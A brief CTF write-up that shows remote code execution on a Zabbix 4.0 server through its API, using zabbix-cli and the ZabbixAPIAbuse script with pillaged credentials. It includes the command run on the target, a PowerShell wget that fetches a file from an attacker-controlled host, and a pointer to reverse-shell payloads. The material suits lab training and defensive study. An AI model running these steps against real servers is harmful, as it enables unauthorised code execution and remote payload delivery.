**Zabbix PE via API**
In one CTF i stubled upon a ***Zabbix vers(4.0)*** which is indeed old that allowed me to perform a RCE via Api endpoints.

## How I tackled it?
1)Identified the API user from previous pillaging
2)Identified that my user have no GUIAccess and API(https://github.com/unioslo/zabbix-cli)
```
pip install git+https://github.com/unioslo/zabbix-cli.git@master
zabbix-cli-init --zabbix-url http://10.9.10.16/zabbix/api_jsonrpc.php
[zabbix-cli zabapi@zabbix-ID]$ show_usergroups
+---------+---------------------------+-------------+------------+--------+
| GroupID | Name                      |  GUI access |   Status   | Users  |
+---------+---------------------------+-------------+------------+--------+
|      16 | API Users                 | Unknown (3) | Enable (0) | zabapi |
|      12 | No access to the frontend | Unknown (3) | Enable (0) | zabapi |
+---------+---------------------------+-------------+------------+--------+
```
3)Now used this to get a RCE(https://github.com/Diefunction/ZabbixAPIAbuse)
```
python3 ZabbixAPIAbuse.py
URL: http://10.9.10.16/zabbix/api_jsonrpc.php
CMD: powershell -c "wget http://10.9.10.10:8080/culo"
Method [Default: action] (action / item): action
Username [Default: Admin]: zabapi
Password [Default: zabbix]: Zabbix
[0]: D3WKT001
[1]: COREWKT002
Host num: 0
[*] Waiting for execution ...
[*] Actions deleted
[*] Triggers deleted
```
4)You can do same to get a RCE via **revshells.com** examples
**OBS**: in my case the machine was Linux(docker) but the back-end was Windows so I had to use the windows command. If it fails test to use Linux/Windows or vice-versa.
Test also the "Item" type and not only the default "Action" type of attack!
